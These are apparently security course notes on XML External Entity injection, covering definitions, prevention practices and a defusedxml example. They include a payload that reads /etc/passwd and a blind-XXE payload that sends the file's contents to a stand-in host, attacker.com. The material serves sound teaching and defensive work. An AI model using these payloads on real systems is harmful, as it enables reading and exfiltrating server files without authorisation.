📖 **XXE (XML External Entity) Injection**

### 🔑 **Summary**

**XXE Injection** is a vulnerability that occurs when an application processes user-controlled XML data without proper validation. Attackers can exploit this vulnerability to read sensitive files from the server, perform server-side request forgery (SSRF), and potentially execute denial-of-service (DoS) attacks. This is significant because XML parsers can handle external entities, leading to unauthorized data access or remote interactions.

---

### 📚 **Definition Bank**

- **XML (Extensible Markup Language):** A markup language used for encoding documents in a format readable by both humans and machines.
    
- **External Entity:** A reference in an XML document that points to an external source, such as a file or URL.
    
- **Blind XXE:** An attack where the response doesn't reveal data directly but can still be exfiltrated through out-of-band techniques.
    
- **SSRF (Server-Side Request Forgery):** An attack where the server makes unauthorized requests to internal resources on behalf of the attacker.
    
- **Namespace:** A collection of XML elements and attributes identified by a unique URI.
    

---

### 🧠 **Key Concepts with Examples**

#### **1. Basic XXE Payload:**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY file SYSTEM "file:///etc/passwd"> ]>
<foo>&file;</foo>
```

**Explanation:** This payload declares an external entity `file` that references the `/etc/passwd` file. When the XML parser processes `&file;`, it includes the contents of the file in the response.

#### **2. Blind XXE with Data Exfiltration:**

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com?data=%file;'>">
%eval;]>
<data>&exfiltrate;</data>
```

**Explanation:** This payload loads `/etc/passwd` and attempts to send the data to an external server controlled by the attacker.

---

### 📊 **Comparison Table: Secure vs Insecure Practices**

|**Secure Practice**|**Insecure Practice**|
|---|---|
|Use **SAX** or **StAX** parsers|Use **DOM** parsers (more vulnerable)|
|Disable external entity loading|Allow external entity loading|
|Use `secure processing` mode|Default XML parser settings|
|Validate and sanitize input|Process untrusted XML directly|

---

### ✅ **Best Practices for Preventing XXE Attacks**

- **Disable External Entity Processing:** Ensure the XML parser does not process external entities.
    
- **Use Safer Parsers:** Choose parsers like SAX and StAX over DOM.
    
- **Input Validation:** Properly validate and sanitize all XML inputs.
    
- **Implement Least Privilege:** Limit the server's file system access.
    
- **Use Security Libraries:** Consider libraries like `defusedxml` in Python.
    

---

### 💻 **Secure Code Snippet (Python)**

```
import defusedxml.ElementTree as ET

data = """
<?xml version="1.0"?>
<data>
  <name>John Doe</name>
</data>
"""

try:
    tree = ET.fromstring(data)
    print(tree.find('name').text)
except ET.ParseError:
    print("Invalid XML data")
```

**Explanation:** This code uses the `defusedxml` library, which mitigates XXE vulnerabilities by disabling entity processing.

---

### 📌 **Conclusion**

XXE vulnerabilities can lead to severe security issues such as data breaches and server-side request forgery. Following best practices like disabling external entities and using secure parsers can help protect against these attacks.

---

### 🏷️ **#XXE #WebSecurity #CourseNotes #PenTesting**